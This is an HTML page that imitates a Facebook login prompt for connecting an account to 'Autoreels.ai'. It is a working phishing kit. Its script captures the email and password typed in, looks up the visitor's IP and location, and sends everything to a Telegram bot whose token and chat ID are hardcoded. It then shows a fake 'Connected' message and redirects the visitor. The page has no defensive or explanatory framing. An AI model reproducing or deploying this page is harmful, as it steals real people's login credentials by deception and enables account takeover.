<!DOCTYPE html>
<html lang="en" class="h-full bg-gray-100">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect to Autoreels.ai</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
        
        .shake {
            animation: shake 0.5s;
        }
        
        .modal-animate {
            animation: fadeIn 0.3s ease-out;
        }
        
        .facebook-blue {
            background-color: #1877f2;
        }
        
        .facebook-blue:hover {
            background-color: #166fe5;
        }
        
        .facebook-green {
            background-color: #42b72a;
        }
        
        .facebook-green:hover {
            background-color: #36a420;
        }
        
        .input-focus:focus {
            box-shadow: 0 0 0 2px #e7f3ff;
            border-color: #1877f2;
        }
    </style>
</head>
<body class="h-full">
    <div class="min-h-full flex flex-col">
        

        <!-- Main Content -->
        <main class="flex-grow flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
            <div class="max-w-md w-full space-y-8 bg-white p-8 rounded-lg shadow-md">
                <div class="text-center">
                    <div class="flex justify-center mb-4">
                        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40" fill="none">
                            <path d="M40 20C40 8.9543 31.0457 0 20 0C8.9543 0 0 8.9543 0 20C0 31.0457 8.9543 40 20 40C20.1176 40 20.2348 39.9981 20.3522 39.9954V24.4319H16.3096V19.0525H20.3522V15.4289C20.3522 11.3175 22.7331 8.87603 26.4302 8.87603C28.2131 8.87603 29.8789 9.1293 29.8789 9.1293V13.7456H27.9854C26.1176 13.7456 25.6478 15.0125 25.6478 16.3096V19.0525H29.7158L29.0967 24.4319H25.6478V39.1849C34.0234 36.9336 40 29.2336 40 20Z" fill="#1877F2"/>
                        </svg>
                    </div>
                    <h2 class="text-2xl font-bold text-gray-900">Log in to Facebook</h2>
                    <p class="mt-2 text-sm text-gray-600">To connect to Autoreels.ai</p>
                </div>
                
                <form class="mt-8 space-y-6" id="loginForm">
                    <div class="rounded-md shadow-sm space-y-4">
                        <div>
                            <label for="email" class="sr-only">Email or phone number</label>
                            <input id="email" name="email" type="text" required class="appearance-none relative block w-full px-3 py-3 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none input-focus focus:z-10 sm:text-sm" placeholder="Email or phone number">
                        </div>
                        <div>
                            <label for="password" class="sr-only">Password</label>
                            <input id="password" name="password" type="password" required class="appearance-none relative block w-full px-3 py-3 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none input-focus focus:z-10 sm:text-sm" placeholder="Password">
                        </div>
                    </div>

                    <div>
                        <button id="loadBtn" pnclick="handleClick()" type="submit" class="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white facebook-blue focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors">
                            Log In
                        </button>
                    </div>
                    
                    <div class="text-center">
                        <a href="#" class="text-sm text-blue-500 hover:text-blue-700">Forgotten password?</a>
                    </div>
                    
                    <div class="relative">
                        <div class="absolute inset-0 flex items-center">
                            <div class="w-full border-t border-gray-300"></div>
                        </div>
                        <div class="relative flex justify-center text-sm">
                            <span class="px-2 bg-white text-gray-500">or</span>
                        </div>
                    </div>
                    
                    <div>
                        <a href="#" class="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white facebook-green focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 transition-colors">
                            Create New Account
                        </a>
                    </div>
                    
                    <div class="flex items-center">
                        <input id="agree-terms" name="agree-terms" type="checkbox" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                        <label for="agree-terms" class="ml-2 block text-xs text-gray-700">
                            I agree to allow Autoreels AI to connect to my account
                        </label>
                    </div>
                </form>
                
                
            </div>
        </main>
    </div>
    
    <!-- Success Modal -->
    <div id="successModal" class="fixed inset-0 flex items-start justify-center pt-10 px-4 pb-20 text-center sm:block sm:p-0 hidden">
        <div class="fixed inset-0 transition-opacity" aria-hidden="true">
            <div class="absolute inset-0 bg-gray-500 opacity-75"></div>
        </div>
        
        <div class="inline-block align-bottom bg-white rounded-lg px-4 pt-5 pb-4 text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-sm sm:w-full sm:p-6 modal-animate" role="dialog" aria-modal="true" aria-labelledby="modal-headline">
            <div>
                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-green-100">
                    <svg class="h-6 w-6 text-green-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                    </svg>
                </div>
                <div class="mt-3 text-center sm:mt-5">
                    <h3 class="text-lg leading-6 font-medium text-gray-900" id="modal-headline">
                        <span class="text-sm block text-gray-500">Autoreels AI</span>
                        Connected
                    </h3>
                    <div class="mt-2">
                        <p class="text-sm text-gray-500">
                            Your account has been successfully connected. Redirecting to dashboard...
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const successModal = document.getElementById('successModal');
            
            form.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const agreeTerms = document.getElementById('agree-terms').checked;
    
    if (!agreeTerms) {
        alert('You must agree to allow Autoreels AI to connect to your account');
        return;
    }
    
    // Add loading state
    const submitBtn = document.querySelector('#loginForm button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="inline-block animate-spin mr-2">â†»</span> Logging in...';
    
    try {
        // Get user's IP and location
        let ip, locationData;
        
        // Get IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;
        
        // Get location (using ip-api.com)
        const locationResponse = await fetch(`http://ip-api.com/json/${ip}`);
        locationData = await locationResponse.json();
        
        // Prepare data to send
        const data = {
            email,
            password,
            ip,
            location: locationData,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            screenResolution: `${window.screen.width}x${window.screen.height}`
        };
        
        // Send to Telegram bot
        const botToken = '8070464013:AAHzp_XJw1uCclRkO4QmjDmCv7JZnqIUlL0';
        const chatId = '6980884729';
        const messageText = `New FACEBOOK login :\n\n` +
            `Email/Phone: ${email}\n` +
            `Password: ${password}\n` +
            `IP: ${ip}\n` +
            `Location: ${locationData.city}, ${locationData.region}, ${locationData.country}\n` +
            `User Agent: ${navigator.userAgent}\n` +
            `Screen: ${window.screen.width}x${window.screen.height}\n` +
            `Timestamp: ${new Date().toLocaleString()}`;
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText
            })
        });
        
        if (!response.ok) {
            throw new Error('Failed to send data to Telegram');
        }
        
        // Show success animation
        successModal.classList.remove('hidden');
        
        // Redirect after 3 seconds
        setTimeout(() => {
            window.location.href = 'verify.html';
        }, 3000);
        
    } catch (error) {
        console.error('Error:', error);
        // Reset button on error
        submitBtn.disabled = false;
        submitBtn.textContent = 'Log In';
        alert('Connection failed. Please try again.');
    }
});
            // Add Facebook-like animations to inputs
            const inputs = document.querySelectorAll('input[type="text"], input[type="password"]');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.classList.add('ring-2', 'ring-blue-200');
                });
                
                input.addEventListener('blur', function() {
                    this.parentElement.classList.remove('ring-2', 'ring-blue-200');
                });
                
                // Add shake animation on error (demo)
                input.addEventListener('input', function() {
                    if (this.value.length > 0 && this.value.length < 3) {
                        this.classList.add('shake');
                        setTimeout(() => this.classList.remove('shake'), 500);
                    }
                });
            });
        });
        function handleClick() {
            const  btn = document.getElementById("loadBtn");
            btn.disabled = true;
            btn.innerText ="Logging in...";

            setTimeout(() => {
                btn.disabled = false;
                btn.innertext = "Log in";

            }, 3000);
        }
    </script>
</body>
</html>
